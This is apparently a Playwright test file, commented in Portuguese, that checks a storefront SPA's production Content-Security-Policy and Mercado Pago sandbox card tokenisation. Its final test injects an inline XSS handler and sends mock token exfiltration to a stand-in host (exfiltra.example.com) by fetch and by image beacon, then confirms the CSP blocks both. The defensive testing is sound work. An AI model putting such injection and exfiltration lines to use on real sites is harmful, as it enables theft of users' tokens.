import { test, expect, type Page } from '@playwright/test';
import { E2E } from '../../../support/env';
import { signInAs } from '../../../support/web';
import { openHome } from './helpers';

/**
 * Content-Security-Policy do SPA. Ela é aplicada SÓ no build de produção (vite build → <meta http-equiv>, e o
 * vite preview também envia os cabeçalhos): o Vite de desenvolvimento usa scripts inline (React Refresh).
 * Contra o servidor de desenvolvimento da suíte estes testes são pulados; rode-os contra o build:
 *   cd frontend-web && VITE_API_URL=<api> npx vite build --outDir <pasta> && VITE_API_URL=<api> npx vite preview --outDir <pasta> --port <porta web>
 */
const NO_CSP = 'O servidor web é o Vite de desenvolvimento: a CSP só existe no build de produção (vite build / vite preview).';

/** Chave pública de TESTE do Mercado Pago (sandbox) usada pelo front em desenvolvimento. */
const MP_TEST_PUBLIC_KEY = 'TEST-6aeab6dc-85c6-4d63-b0e6-8f605114628d';

interface Violation {
  directive: string;
  blocked: string;
}

/** Registra as violações de CSP da página (evento securitypolicyviolation) desde o primeiro script. */
async function recordViolations(page: Page): Promise<() => Promise<Violation[]>> {
  await page.addInitScript(() => {
    const list: { directive: string; blocked: string }[] = [];
    (window as unknown as { __cspViolations: typeof list }).__cspViolations = list;
    document.addEventListener('securitypolicyviolation', (event) => {
      list.push({ directive: event.effectiveDirective || event.violatedDirective, blocked: event.blockedURI });
    });
  });
  return () => page.evaluate(() => (window as unknown as { __cspViolations?: Violation[] }).__cspViolations ?? []);
}

/** Diretivas da CSP publicada na página (meta http-equiv), ou null sem CSP. */
async function pagePolicy(page: Page): Promise<Map<string, string[]> | null> {
  const content = await page.evaluate(
    () => document.querySelector('meta[http-equiv="Content-Security-Policy"]')?.getAttribute('content') ?? null,
  );
  if (!content) return null;
  const directives = new Map<string, string[]>();
  for (const part of content.split(';')) {
    const [name, ...values] = part.trim().split(/\s+/);
    if (name) directives.set(name, values);
  }
  return directives;
}

/** Página servida pelo Vite de desenvolvimento (cliente do HMR), e não por um build de produção. */
async function isDevServer(page: Page): Promise<boolean> {
  return page.evaluate(() => !!document.querySelector('script[src="/@vite/client"]'));
}

const apiOrigin = new URL(E2E.apiURL).origin;

test.describe('CSP do build de produção', () => {
  test('a página publica uma CSP restritiva: scripts só do site e do Mercado Pago, sem inline/eval, API liberada', async ({ page }) => {
    const response = await page.goto('/');
    const policy = await pagePolicy(page);
    test.skip(await isDevServer(page), NO_CSP);
    expect(policy, 'build de produção sem Content-Security-Policy').not.toBeNull();

    const script = policy!.get('script-src') ?? [];
    expect(script).toContain("'self'");
    expect(script.some((source) => source.includes('mercadopago.com'))).toBe(true);
    expect(script, 'sem scripts inline nem eval').not.toEqual(expect.arrayContaining(["'unsafe-inline'"]));
    expect(script).not.toEqual(expect.arrayContaining(["'unsafe-eval'"]));
    expect(policy!.get('default-src')).toEqual(["'self'"]);
    expect(policy!.get('object-src')).toEqual(["'none'"]);
    expect(policy!.get('base-uri')).toEqual(["'self'"]);
    expect(policy!.get('connect-src')).toEqual(expect.arrayContaining(["'self'", apiOrigin]));
    expect(policy!.get('img-src')).toEqual(expect.arrayContaining(["'self'", apiOrigin]));
    expect(policy!.get('form-action')).toEqual(["'self'"]);

    // Servidor do build (vite preview): cabeçalhos que a meta não cobre
    const headers = response!.headers();
    if (headers['content-security-policy']) {
      expect(headers['content-security-policy']).toContain("frame-ancestors 'none'");
      expect(headers['x-content-type-options']).toBe('nosniff');
      expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    }
  });

  test('com a CSP, a vitrine abre sem violações e o SDK do Mercado Pago carrega e tokeniza o cartão de teste', async ({ page }) => {
    const violations = await recordViolations(page);
    await openHome(page);
    test.skip(await isDevServer(page), NO_CSP);

    // Mesmo SDK e chamadas que o formulário de cartão usa (sdk.mercadopago.com + API de tokenização)
    const cardToken = await page.evaluate(async (publicKey) => {
      await new Promise<void>((resolve, reject) => {
        const script = document.createElement('script');
        script.src = 'https://sdk.mercadopago.com/js/v2';
        script.onload = () => resolve();
        script.onerror = () => reject(new Error('SDK do Mercado Pago bloqueado ou indisponível'));
        document.head.appendChild(script);
      });
      type Sdk = new (key: string, options: { locale: string }) => {
        createCardToken(data: Record<string, string>): Promise<{ id?: string }>;
      };
      const MercadoPago = (window as unknown as { MercadoPago: Sdk }).MercadoPago;
      const sdk = new MercadoPago(publicKey, { locale: 'pt-BR' });
      const token = await sdk.createCardToken({
        cardNumber: '5031433215406351',
        cardholderName: 'APRO',
        cardExpirationMonth: '11',
        cardExpirationYear: '2030',
        securityCode: '123',
        identificationType: 'CPF',
        identificationNumber: '12345678909',
      });
      return token.id ?? null;
    }, MP_TEST_PUBLIC_KEY);

    expect(cardToken, 'token do cartão de teste').toBeTruthy();
    // Nenhum endereço do SDK é bloqueado. O único bloqueio esperado é o script INLINE do perfil do dispositivo
    // (antifraude) que o SDK injeta: sem 'unsafe-inline', ele só roda com um nonce enviado pelo servidor
    // (deviceProfileCspNonce, lido de <meta property="csp-nonce">). A tokenização não depende dele.
    const blocked = await violations();
    expect(blocked.filter((v) => v.blocked !== 'inline')).toEqual([]);
    expect([...new Set(blocked.map((v) => v.directive))].filter((d) => d !== 'script-src-elem')).toEqual([]);
  });

  test('com a CSP, o painel (gráficos, ícones e imagens) abre sem violações', async ({ page }) => {
    const violations = await recordViolations(page);
    await signInAs(page, 'admin');
    await page.goto('/dashboard');
    test.skip(await isDevServer(page), NO_CSP);
    await expect(page.getByRole('heading', { level: 1, name: /^Dashboard/ })).toBeVisible({ timeout: 20_000 });
    await page.goto('/products');
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible({ timeout: 20_000 });
    await page.waitForLoadState('networkidle');
    expect(await violations()).toEqual([]);
  });

  test('com a CSP, um script injetado não roda handlers inline nem envia dados para outro site', async ({ page }) => {
    const violations = await recordViolations(page);
    await openHome(page);
    test.skip(await isDevServer(page), NO_CSP);

    await page.evaluate(() => {
      // Handler inline (o caminho típico de um XSS armazenado) e exfiltração por fetch e por imagem
      document.body.insertAdjacentHTML('beforeend', '<img src="data:," onerror="window.__xss = 1" alt="">');
      void fetch('https://exfiltra.example.com/c', { method: 'POST', body: 'token', mode: 'no-cors' }).catch(() => undefined);
      new Image().src = 'https://exfiltra.example.com/p.gif?t=token';
    });

    await expect.poll(async () => (await violations()).map((v) => v.directive).sort()).toEqual(
      expect.arrayContaining(['connect-src', 'img-src']),
    );
    // Com a CSP na <meta> e no cabeçalho (vite preview), cada bloqueio é relatado uma vez por política
    const blocked = (await violations()).filter((v) => v.blocked.startsWith('https://exfiltra.example.com'));
    expect([...new Set(blocked.map((v) => v.directive))].sort()).toEqual(['connect-src', 'img-src']);
    expect(await page.evaluate(() => (window as unknown as { __xss?: number }).__xss)).toBeUndefined();
  });
});
